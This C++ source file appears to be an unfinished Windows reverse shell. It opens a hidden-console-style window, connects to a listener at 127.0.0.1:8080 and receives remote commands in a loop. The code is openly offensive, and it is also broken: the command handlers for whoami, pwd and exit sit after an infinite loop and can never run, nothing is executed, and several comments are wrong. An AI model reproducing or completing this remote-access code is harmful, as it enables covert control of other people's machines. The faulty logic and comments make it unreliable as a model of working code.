// C++ Headers

#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#endif

// C Header
#include <iostream>


#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

void revShell();

using namespace std;

int main() 
{
    HWND stealth;       // Declared handler

    AllocConsole();     // Make a new console
    stealth = FindWindowA("ConsoleWindowClass", NULL); // Find the earlier Window and then hide or show depending on earlier command
    ShowWindow(stealth,SW_SHOWNORMAL); // Code follows: 1=show, 0=hide
    
    revShell();         // Call reverse shell function

    return 0;
}

void revShell()
{
    WSADATA wsaver;
    WSAStartup(MAKEWORD(2,2), &wsaver);
    SOCKET tcpsock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    addr.sin_port = htons(8080);

    if(connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr))==SOCKET_ERROR) {
        closesocket(tcpsock);
        WSACleanup();
        exit(0);
    }
    else {
        std::cout << "Loading... " << std::endl;
        std::cin.get();
    }
    // We use char instead of strings due to its size being much less
    char CommandReceived[DEFAULT_BUFLEN] = ""; 
    // This whole entire next part is delegating the right amount of space to heap/memory so that way no buffer overflow happens
    while (true)
    {
        int Result = recv(tcpsock, CommandReceived, DEFAULT_BUFLEN, 0); // Recv is a Windows API call that works with the while loop
        std::cout << "Command received: \n" << CommandReceived;
        std::cout << "Length of Command Received: \n" << Result << std::endl;
        memset(CommandReceived, 0, sizeof(CommandReceived));
    }

    // We choose these commands due to their size and that memset does not get flushed
    if ((strcmp(CommandReceived, "whoami\n") == 0)) {
        std::cout << "Command parsed: whoami\n" << std::endl;
        //Execute a whoami() function
    }
    else if ((strcmp(CommandReceived, "pwd\n") == 0)) {
        std::cout << "Command parsed: pwd\n" << std::endl;
        //Execute a pwd() function
    }
    else if ((strcmp(CommandReceived, "exit\n") == 0)) {
        std::cout << "Command parsed: exit\n";
        std::cout << "Closing connection\n" << std::endl;
        //Exit 
    }
    else {
        std::cout << "Command not parsed!\n" << std::endl;
    }
    closesocket(tcpsock);
    WSACleanup();
    exit(0);
}